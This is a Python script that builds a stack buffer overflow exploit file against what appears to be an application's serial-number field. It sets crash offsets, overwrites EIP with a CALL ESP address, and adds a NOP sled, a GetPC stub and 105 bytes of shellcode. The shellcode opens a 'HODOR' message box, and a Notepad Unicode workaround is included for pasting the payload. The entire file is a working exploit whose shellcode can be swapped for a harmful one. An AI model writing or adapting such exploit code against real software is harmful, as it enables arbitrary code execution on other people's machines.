import sys, struct

filename = "sploit_blade_api.txt"

# nasm -f elf msgbox_hodor.asm; ld -m i386pe -o msgbox_hodor msgbox_hodor.o
# bash convert_bin_sc.sh msgbox_hodor.o
# 105 bytes
shellcode = (
"\x31\xd2\xeb\x33\x59\x88\x51\x0a"
"\xbb\x5c\x39\xe3\x77\x51\xff\xd3"
"\xeb\x35\x59\x31\xd2\x88\x51\x0b"
"\x51\x50\xbb\xd3\x33\xe3\x77\xff"
"\xd3\xeb\x35\x59\x31\xd2\x88\x51"
"\x0f\x52\x52\x51\x51\x52\xff\xd0"
"\xb8\x4f\x21\xe3\x77\xff\xd0\xe8"
"\xc8\xff\xff\xff\x75\x73\x65\x72"
"\x33\x32\x2e\x64\x6c\x6c\x4e\xe8"
"\xc6\xff\xff\xff\x4d\x65\x73\x73"
"\x61\x67\x65\x42\x6f\x78\x41\x4e"
"\xe8\xc6\xff\xff\xff\x48\x4f\x44"
"\x4f\x52\x48\x4f\x44\x4f\x52\x48"
"\x4f\x44\x4f\x52\x4e"
        )

# Get Program Counter (to control EIP) via ESI
getpc = (
            "\xEB\x05"                      # jmp short (5 bytes) to 'jmp back' at end
            "\x5E"                              #pop esi
            "\x41"                             #nop (inc ecx)
            "\xFF\xD6"                      #call esi
            "\x41"                              #nop (inc ecx)
            "\xE8\xF6\xFF\xFF\xFF"     #jmp back to pop esi
)

# Lengths
maxlen = 5000

# Offsets
crash_ecx = 544
crash_ebx = 494
crash_ebp = 556
crash_eip = 560
crash_seh = 564

# Notepad Unicode bug: translates characters differently to be able to copy/pase in SN field
notebug = (
                "\xB8\x06\xAA\x6F\x50"
                "\x6F\x4C\x6F\x58\x6F"
                "\x05\x73\x00\x6F\xB0"
                "\xB9\xD8\xAA\x6F\xE8"
)

# Crafting variables
prefix = notebug
prefix += "A" * crash_eip
eip = struct.pack("<L", 0x0041da65)                     # CALL ESP
suffix = "\x90" * 16
suffix += getpc
suffix += shellcode
suffix += "B" * (maxlen - len(prefix + eip + suffix))

# Constructing payload
payload = prefix + eip + suffix

# Write file
f = open(filename, 'wb')
f.write(payload)
f.close()
